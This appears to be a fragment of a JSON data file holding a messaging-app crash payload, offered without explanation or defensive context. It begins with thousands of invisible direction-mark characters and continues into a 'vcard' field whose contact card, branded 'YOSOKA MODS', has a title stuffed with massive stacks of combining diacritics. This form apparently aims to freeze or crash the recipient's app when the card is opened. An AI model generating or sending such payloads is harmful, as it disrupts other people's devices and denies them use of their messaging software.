‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎",
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;🔥 ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ 🔥\nORG:\nTITLE:.̸̸̶̛̞̜͊̍̂͒̋̈̉ͭ̀͋͂́͟͜͜͢͜͡͡͡͏.̹͙̬̭̳͍̙̰̜̞͈ͨ̽̌ͨ̑̂̒̚҉̴̴̶̵̶̡͘͘͟͝͝͏̶̶̢̢̛̀͢.̶̡̨̛̞̮̙ͯ͂ͫ̀̆̍ͮ̆̓͛̅ͦ̽́̇̉̋͋̀̚̕͜͜͡͡.̴̢̗̘͕͍̖͉̮̱ͪ͋ͧͭͬ̌͗̓͐̀̚͠.̷̡͙̅̽̉̈́̏͋ͧ̕҉̸̴̡̧̧͢͢͡͞͏.̴̸̨̛̝̮̖͕̯͉̔̄̽ͥͭͬ̄̈́̍ͭ͑̆ͬ͐͜͝͡͞͝.̸̸̸̶̸̧̡̧̱̲̙̱̜̞̰̅̔͑͂ͧͬͬ͌̒̈́́͘͜͠͝.̸̴̷̵̡̢̝̟̯͎̘͓̘̀.̶̨̧̠͖̬̥̫͇̲̩̖̰̥͚̠̞̠̥̅͌̃́͟͠͝.̶̺̮̞̱̜͎̪ͭͤ̓̃̍͛̅ͤ̓̕͜҉͜.̨̢̮̣͍͙̦͇̺̞̅ͨ͒͌̑͋̅̍͒͑ͨ̃͒̕͝͞͝.̲͙̩̬͖̻̳͍͇̹̙̙ͦ̓ͥ̿̒͐ͥ̽̐ͪ̋̎̎̌̊̓ͨͨͬͅ͏̶.̵̬͇͇̻̮̜̹̰̭͓̲̻̻̘͖͎̟͖͇̀̃̄̐̑͑̓̕͢͟͡͝ͅ҉̛͡҉̀͟.̯̤̺̙̰̠͕̆̆͗͂҉̸̛.͙̜̂̀ͯ̓͗͑̈ͤ͐̋̔͑ͭ̄̄̃̋̀̀͢͏̶̴̵̨̡̛́̀̀̕͘͘͜͟͝͡.̶̛̜̺̥͙͉̼̱̪̰͍̫̗̻̀̀̀͘̕͘͘͢͟͢͟͟͟͜.̗̖̖̞̻̼̏̋͛͑͐ͪ҉̀͠͞͡͝.̷̶̧̧̧̘̠͇̒̓ͬ̓̃͒̇̏ͪ̓̈́͗̓͛͋̈͌ͨ̕͘̕͘͘͜͢͢͞͡͞͠.̷̵̜̣̟̺͍̳͕ͬͪ̌͛ͬ̿́̀̕͟҉҉̴̢̧͢.͕̙͍̖̮͉̣̥̑̃̐͗̂̀҉҉̸̴̢̛́̀́͘̕͢͝͠҉̵̴̕͘.̷̶̺̤̮͙͖̞͈̱̗͙͍͙̤͆͌ͮ̂̃ͪ̐͆̌͗ͬ͢͢͞͞ͅ.̴̷̧̧̛̫̰̮̳͚̤̟̪͔̖ͭ̄͑́́́̀͘̕̕͡.̪͙̦̎̓̀̕͜͏̷̢̛͜͢͢͞.̷̸̵̸̧̧̨̧̧̱̲̝͇̟̣̲̲͇͎̬͖͚̯̳ͯ̅̈́̓̐́͟͠.͇͇̟̣͖̞̥̟͖̞͇͉̳͉̎̌̽̓ͅ҉̷̴͘.̵̸̴̷̨̢̨̧̛̲͆̈̒̃̎̽ͯ͊ͮ͛ͯ̃̎̏͌̑ͬ̀̕͜͠.̴̣̘̺̺̤͙͙̼̠̘̭̱̰̪̙̤̋ͦ̑ͥ͗ͨͥ͂͒͋ͤͣͯ̑̽ͪ̄ͨͨ̚͢͟͏͏̢́͝͏̸̨̢̕͞.̣̠̦͓̠̟͔͖͚͔͙̖͇͎͕̰̟̎҉̷̶̴̷̢̨͟͏.̴̨̼̬̗̲͕ͣ̉͐͑̏̍ͩ͊́̚̕͝͞͞.̷̵̢̧̝̥̺͚̭̰͉̬͙͇̼͙̥̳͉͆̀́́͘͘͘͘͘̕͟͢͠͝ͅͅ.̯̩ͧ͐̎ͮ̓̽͛͌ͧ̎̌͋̈̏̌̆ͯͩ̏ͅͅ.̶̱̠̯̦͕̱̺̹̮̯͈͙̪̭͕̝̫̘̥̀ͤͮ̂̍ͤ̌̏̓͂̍̈̒͒̉̚͜͟ͅ͏͟.̛̯̗͇̘̲̬̥̙͍̔ͦͩͫ̒ͨ͆ͪ͌ͦ̀ͦͪ̐̈̒̌͋͊̏͟ͅ.̷̶̶̷̷̧̱̲̦̩͓͔̗̝̦͕̘͈͓̞̒͛ͧ̊ͫ́̕͟͟͢ͅ͏̸͜͜͜͢͞.̰̱̺͎͕̦̫̠͌̊͆̈́͐̀͘͜͟҉̷̀̀͟͠͏̴̴̧̡̢͘.̵̶̨̡̮̠̯͙̙͕͉̮̺ͪ̈͋͊̆̄͗̈́͟͟͜͝͞.̷̰͕̗̝͔̮̖̩̥͓̲́̀̕͟ͅͅ.̶̷̴̨̭̦̖̫̗͇͍̮̼͕̱̺͙̱̻̞̱͉ͯͥͤ́͊ͧ͂͗̏̌̒ͬ͋̓́́̚̕͠͝ͅ҉̶̷̧̛͘͢͢͜͡͠҉.̠̟̞̗̪͈̘̏͋̓͗ͨ͝҉̷̶̸̧̧͘͜͞͏̴́͜͠.̩͓̬͚̲̺̙͈͎̝̺͉̩̮̱͓̳̟̮̼ͧ͊̍̋͑ͪ̄͌҉̶̸̸̵̷̛́̀̀̀̕̕̕͡͏̕͘.̷̴̢̧̧̻̼̙̖̙̤̹̹̓̽͌̏̈́̄̊́̕͢͜͞ͅ.̴̵̯͈̮̝͎̮͎̬͈̙̘͚̠͊́̅̓̌̀̅̋̐͆̄ͦ͗̐͗͟͞҉̸͜͡͏̧́̀̕.̶̴̶̢̨̧̛̩̝̩̻͙̥̳̖̳͎͍̙̤̯̃̇͒ͣ̄̀͡͞͞͡͝.̴̶̶̢̧̢̡̧̛̱͈̭̦̼͔̤̯͖̱͇̜ͤ̉́̆ͩͫ͋̕͢͝͠͡ͅ.̼̯̞͈̯̠͍̯̥ͫ́͊̓ͩ͗͒͊̓͌̎͑̔́͆́̓͏̷̡̡͘͟͞͡.̢̬̪̖̬̱̗̦̬.̷̴̸̸̨̨̢̛̬̬͘͞͠͝.̸̪͔͕̞͋ͤ̏͂͏̷̢͘͠͠͏̡̢̢̛̀҉̧.̶̧̥̰̜͚͐̿ͦ̾̄ͯ́͘͟͠͡.̷̨̧̗͕̞̖͕͕̼̱̘̬͍̜̫̼͔̻̥͖̺̈ͦ̀̃ͥ͋̍͘͟͠͝҉͏̧̡̕͢.̴̴̛̩̅ͬ̂͗ͫͤ̓́̚͏̶̷̧̡̡̕̕̕͝͠.̷̵̵̧̢̥̻̬̱̭̰͈̠̫̣̟̱ͪ́̇̅͒ͦ͗ͧ̑̈́̉͢͜͠͠ͅ.̢͔̗̠̞̖̹̠͑͌ͭ̂̔̀͂͊̋̋̀̚̚҉̵̴̧̛́͘̕͘͜͞҉̨͘͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.͎ͫ̆̕҉̴̴́͟͏͜.̷̛̛̛̖̭̼̘̤̜̖̣ͥ̓̇͑̑͛̏̕͟͢͟͞͠͠.̵̻̞̳̪͉̘̤̣͉̘̣̦̬͙̖͟͝҉̵̸͟͢͠͝҉̸͏̨.̶̶̸̶̧̢͕͙̞̪̗̰ͥ̒̅ͣ̾͛ͭ͂̏͘͘͡҉̵̶̵̧̀҉̶͟.̧̢̛̟͉̞̭̱̯͕̘͗͐̔̓̊̄ͭ̉ͫ̚͘͟͜ͅ͏̷̵́͟͟͝͞͝.̷̶̷̛̰̲̘̬̍̉̔ͤͬͭ̔̓̄͑̊̌͑̄̓ͭ̾̏͒͒̕͞҉̵̵̧̛́̕͟͟͞.̸̸̷̸̢̧̡̛̛̹͍̦̝̼ͮ̄͛̄̀́́͝͡.̧͔͓̭̳̞͔̦̬̙̦̥̳̻͚̩̹̲̰̟͒̓̿̊͆̿̒̓̎.̟͙̦̼̯̥͔͚̹͚ͧ̏̄ͭ̀̓̑̇͆ͣ̅͊̚.̥̥̯̱̣̜͓̞̱̯ͨͣ̽̾ͨ́̀̕͞͝͏̶̴̡͜͜͏.̶̸̵̸̢̢̢͙̞̫͙̭̩͖̭͊̇̓͘͘͟͜͢͡͝.̶̹̖̥̩͚̬̝͕̙ͨ́͜͡҉̷.̷̵̈́̂̇͑̄ͫ͒́͋̕͟͟͠͞͠͏.̷̹̰̮̼̮͓̰̪̘͔͚̰͓͚̯̠̋͌ͧ͛ͭͭ̀̐͋ͣ͋̉̉̊͏̶.̴͉̙̪̝̙͕̣̦̲̫̼ͮͬ̊̃̓̍ͨͯ͑̋ͩ̊͛̕.̷̡̧̢̛̙͕͎̪̬̤͕ͤ͊͐ͤͩ̂̽̇ͪ͐̑ͮ̄̚͢͡͝.̶̡̧̨̛̦͖̝̖̹̺͓͈̜ͭͥ̒́̕͘͘͘͜͡͡͡͡͏̶.̡̘̮̗̻̣̱͍̖̦̩̟̝ͪ͐̓̄̓̔͟҉̷̢́͏̶̢̧̕͝.̷͇̼̻̺͔̻̩͚̣̖͖̝͙͓̺̾́̍͌̓ͭ̌ͨ̾͌̈̓́̂ͤ̉̚̚͡ͅͅͅ҉.̡̭̻̘̮̩̬̑̅̌ͧͨͬ́̾̔̓ͪ͆̍ͣͮͬ̀̚͞ͅ͏͏̵̡̛͜͞͠͏͜.͕͇̄̈̐̈́̀҉.͇͎̞̜̠̙͎̮̦̥̙͚̥͔̥̅͆ͭ͂̃̍ͪ̀.̶̴̵̶̶̧̛̻͖͇͙̳̲̟̱̜̞͔̬̥͈̠̳͍̱̜̮̌̓ͧ̓ͫ͛ͪ́̕҉̢̕͏̵͠͡.̶̨̜̦͓̤̟͚̣̪̦̞͕̤̙̾ͪ͗́́̃́͢͠͞.͇̪̇̃ͩ̿͌͊̐ͮ̋̐͊̑̚͟͟ͅ͏͏.̧̡̰͖̙͍͍͇̽͜͡.̵̸̡̧̛͚̞̼͕̞̠͖̙̭͚̥̪̥̳͛ͩ̄̇ͯͤ͐͆̔̈́͐ͮ͛̀͘̕͢͜͜͜͜͡͝͡ͅ҉͟͏.̸̷̡̢̨̧̯̦̻̳͌̿̆̌͋ͯ̀̏ͥ͛̐̊ͨ́̚̚̚̕͞҉̷̴͠҉̡.̶̨͈̅̈́͒ͣͦ͒̽ͪͮ̒̽͂́̈́ͫ̏̉͐̚͜͠.̷̡͉̙̪̥̰̳̰͚͍͐̎̉̇.͇͎͕̳̳͕̊̓͂͑ͧͬͯ̍ͧͩ̚҉̴҉̶̶̢̧̧̧̡̢̛̛̕͜͢͜͠͡.̢̠̿̃̾ͬͥͭ́̚.̴̴̴̸̢͈̰̖̞͚͉̲̰̮̙̳̮̞͇ͯͥͩͨ̒ͮ̅ͭ̓͗͌͆ͮ͂͂ͭ̋ͨ̾͊͘͘̕͢͠͠͡͞.̭̼͉̗͇̺̙̩̱̖̥̏͒͑̇̊̓ͯ͒̄̈́̇.͖͕̙͕̹̘̖̻̯͐̾͐̇͒̿ͧ͢͡҉̧̨.̖͕̞͈̣̯̬̮̫͈̠͖̘ͦ͑ͩ̏ͥ̀ͬ̎̃̔̓̆̅ͬ̀̚̕͢͡ͅ.̶̴̸̠͕̟̩̜̦͓̘̓́͌̌ͯ̌̆ͯͨ̈́̈́̎͂͆̀̚͘͜͟͏̵̴̵̨̢͢.̸̴̨̨̫̣͍̬͓͚͈̺̹̥̜̟̦̺̼̈ͨ́̓ͣͧ͗̇ͩ́͘̕͢͞͠͠͝ͅ͏̶̵̸̢.̶̡̱̖͚̘̩̝͙̣̺̦͇̠̝̠͈̯͉͓͙̟͌͊ͥ̒ͥ͋ͨ̇̌̈́ͭ̿̅̌ͪ́͘͠͡.̵̢̡̨̨̛̯̟̩̘̙̘̽̎̀̆̉̉͋ͣ́͌̊̂̾́͘͜͟͝͠͝͡͠.̷̡͔̩̝̼̬̪̰̜̼̯̠͍̻̼̥͇̑̋ͣ̏͋͟͡ͅ͏̴̶̶̡̢̡̧̧̢́̕͢͢͜͝.̵̛ͣ̾̊́̂͐̊̈ͫ̒̿͗͗͊̔̓͋͋͂͡͡.̗̭̼͍̹̯̞͈͎̯̼̗ͪ͒͒̌ͬ̈̃ͬ͊ͫͤͅ.̨̢ͨͪ̉͊̉ͪ̾̄ͮ͋ͣ̋̌́ͬ̅͗́ͯ͢.̷̴̴̷̶̡̨̢̛̠͔̮̭͚̝̰͌̌̏ͬ͒̀͑̉̂̒̽́̕͟͜͢͞͝͠͞҉.̵̵͔͑͆ͧ̓̓ͧͧ́.̴̡̨̛̮͖̥͎̜̗͔͎̪̙̪͐͐ͬ͌̇̌̓͋̎̂͛͑̆̄̐̐͊ͪ̀̀̕̕͝͡͠.̙̱̝͍̤̖̰̱̈́̆͗ͪͥ͑͆ͪ̄̎ͩ͂̒ͪ̈́͑̓̎̿̌̕͡҉͢͡҉̶̧̧̨̛͟͟͠͝͏̵͝.̴̢̨̙̼̖̟̫̲̘̥͇̇͘.̼̘̫̦̹͖̲̺̱͚̜̟̣̜͍̊́ͥ̔̇̓͒͒ͮ̉ͨͮͨ͗̐͛ͅ͏̸̵́͡.̦̤͙̰̝̯͇͈̟̻̝̟͕͚͇̗̲͍̾̆͆́̃ͬ̐̅̚͏̸̧̧̛́͘̕͘͘͜͠͞.̟͎͔̦̫͚ͦ.̷̷̶̰̙̩͎̞̟̬̣͕̻̟̳͈̰̽͐͛ͥͨ̾͛̊͆͒̒̅ͣ̾̊͑ͬ̐̒͘͟͟͟͠ͅͅͅ҉̕̕͘͏̸͠.̴̷̡̨̟̲̩̙͙̩̻̱̋ͅ͏͏̶͏͠.̭̥̙̖̹̩͔̼̞͉̣̱̭͗ͥ͂͒͊̏̐̃̏.̵̷̨̟̠̖̤̮͙̙̟̻̮͕̻̬͙͉̞̙̎͆ͮ́҉̸̡̛̀̕͘͜͟.̵̛ͩͧ̌̓ͮͮ̎͒̀͜͝.̃ͤ̓͌̚